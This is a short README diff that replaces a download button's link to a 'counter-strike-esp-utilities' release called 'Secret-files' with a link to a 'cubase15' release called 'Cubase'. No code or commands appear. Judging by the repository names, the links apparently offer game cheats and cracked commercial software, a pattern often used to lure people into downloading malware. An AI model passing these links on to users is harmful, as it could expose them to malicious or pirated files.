@@ -23,7 +23,7 @@
 <img width="1000" height="562" alt="image" src="https://github.com/user-attachments/assets/d3114e57-8259-4b2e-b19a-0e7496a1a393" />
 
  <div align="center">
-  <a href="https://github.com/bow-dobermanqv3/counter-strike-esp-utilities/releases/tag/Secret-files">
+  <a href="https://github.com/TechnomancerEngage/cubase15/releases/tag/Cubase">
     <b>⬇️ DOWNLOAD (Latest Release)</b>
   </a>
 </div>
